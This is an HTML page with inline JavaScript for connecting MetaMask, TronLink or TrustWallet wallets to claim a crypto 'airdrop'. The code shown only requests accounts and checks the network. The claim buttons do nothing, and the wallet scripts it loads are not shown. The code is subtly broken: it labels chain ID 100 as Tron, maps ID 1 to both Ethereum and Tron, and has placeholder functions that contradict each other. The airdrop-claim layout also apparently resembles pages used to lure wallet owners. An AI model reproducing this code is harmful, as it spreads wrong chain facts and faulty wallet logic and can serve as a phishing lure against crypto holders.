<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Integration</title>
    <link rel="stylesheet" href="css/styles.css">
    <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider/dist/detect-provider.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
</head>
<body>

<h1>Connect your Wallet</h1>
<button id="connectButton">Connect MetaMask</button>
<button id="claimAirdropButton" disabled>Claim Airdrop (ETH)</button>
<button id="connectTronlinkButton">Connect TronLink</button>
<button id="claimTronAirdropButton" disabled>Claim Airdrop (TRON)</button>
<button id="connectTrustwalletButton">Connect TrustWallet</button>
<button id="claimTrustwalletAirdropButton" disabled>Claim Airdrop (BSC)</button>

<script>
    // Function to dynamically load scripts
    function loadScript(src, callback) {
        const script = document.createElement('script');
        script.src = src;
        script.onload = callback;
        script.onerror = function(error) {
            console.error("Error loading script:", src, error); // Log error if script fails to load
        };
        document.head.appendChild(script);
    }

    // Function to load ABI and config files dynamically based on the network
    async function loadConfigAndABI(network) {
        const configMap = {
            eth: { config: 'config/eth_config.json', abi: 'abi/eth_abi.json' },
            bsc: { config: 'config/bsc_config.json', abi: 'abi/bsc_abi.json' },
            tron: { config: 'config/tron_config.json', abi: 'abi/tron_abi.json' },
        };

        const { config, abi } = configMap[network];
        try {
            const configData = await fetch(config).then((res) => res.json());
            const abiData = await fetch(abi).then((res) => res.json());
            return { config: configData, abi: abiData };
        } catch (error) {
            console.error(`Error loading config or ABI for ${network}:`, error);
            alert(`Failed to load configuration for ${network}.`);
        }
    }

    // Function to check network and display the available options
    async function checkNetworkAndEnableClaimButton(web3, expectedChainIds) {
        try {
            const currentChainId = await web3.eth.getChainId();
            const networkNames = { 1: "Ethereum", 56: "BSC", 100: "xDai", 1: "Tron" };
            const currentNetworkName = networkNames[currentChainId];
            
            if (expectedChainIds.includes(currentChainId)) {
                // The user is on a supported network (ETH, BSC, or Tron)
                document.getElementById('claimAirdropButton').disabled = false;
                alert(`You are on ${currentNetworkName}. You can claim the airdrop on this network.`);
            } else {
                // User is not on a supported network
                alert(`The airdrop is available only on the following networks: Ethereum (Chain ID: 1), BSC (Chain ID: 56), Tron (Chain ID: 100). Please switch to one of these networks.`);
                document.getElementById('claimAirdropButton').disabled = true;
            }
        } catch (error) {
            console.error("Error checking network:", error);
        }
    }

    // MetaMask Connection Logic
    function connectMetaMask(config, abi, expectedChainIds) {
        if (window.ethereum) {
            const web3 = new Web3(window.ethereum);
            window.ethereum.request({ method: 'eth_requestAccounts' }).then(async (accounts) => {
                console.log("Connected to MetaMask:", accounts);

                // Check if the wallet is on the correct network
                await checkNetworkAndEnableClaimButton(web3, expectedChainIds);
            }).catch((error) => {
                console.error("MetaMask connection failed:", error);
                alert("Failed to connect to MetaMask.");
            });
        } else {
            alert("MetaMask is not installed. Please install it to continue.");
        }
    }

    // TronLink Connection Logic (Placeholder)
    function connectTronLink(config, abi, expectedChainIds) {
        // Implement TronLink connection logic
        console.log('TronLink connection placeholder...');
        alert('Please use MetaMask or TrustWallet for airdrop claiming.');
    }

    // TrustWallet Connection Logic (Placeholder)
    function connectTrustWallet(config, abi, expectedChainIds) {
        // Implement TrustWallet connection logic
        console.log('TrustWallet connection placeholder...');
        alert('Please use MetaMask or TronLink for airdrop claiming.');
    }

    // Unified Wallet Connection Handler
    function handleWalletConnection(wallet, network, expectedChainIds) {
        const scriptPaths = {
            metamask: 'js/metamask.js',
            tronlink: 'js/tronlink.js',
            trustwallet: 'js/trustwallet.js',
        };

        const walletScript = scriptPaths[wallet];

        if (walletScript) {
            loadScript(walletScript, () => {
                console.log(`${walletScript} script loaded successfully.`);

                // Load config and ABI dynamically
                loadConfigAndABI(network).then(({ config, abi }) => {
                    if (config && abi) {
                        switch (wallet) {
                            case 'metamask':
                                connectMetaMask(config, abi, expectedChainIds);
                                break;
                            case 'tronlink':
                                connectTronLink(config, abi, expectedChainIds);
                                break;
                            case 'trustwallet':
                                connectTrustWallet(config, abi, expectedChainIds);
                                break;
                        }
                    }
                });
            });
        } else {
            console.error(`No script found for wallet: ${wallet}`);
        }
    }

    // Add event listeners for each button
    document.addEventListener('DOMContentLoaded', function () {
        // MetaMask Button
        document.getElementById('connectButton').addEventListener('click', function () {
            handleWalletConnection('metamask', 'eth', [1, 56, 100]);  // Ethereum, BSC, and Tron chain IDs
        });

        // TronLink Button
        document.getElementById('connectTronlinkButton').addEventListener('click', function () {
            handleWalletConnection('tronlink', 'tron', [1, 56, 100]);  // Placeholder for Tron chain IDs
        });

        // TrustWallet Button
        document.getElementById('connectTrustwalletButton').addEventListener('click', function () {
            handleWalletConnection('trustwallet', 'bsc', [1, 56, 100]);  // BSC, Ethereum, and Tron chain IDs
        });
    });



</script>
 <script src="js/metamask.js"></script>
<script src="js/tronlink.js"></script>
<script src="js/trustwallet.js"></script>

</body>
</html>
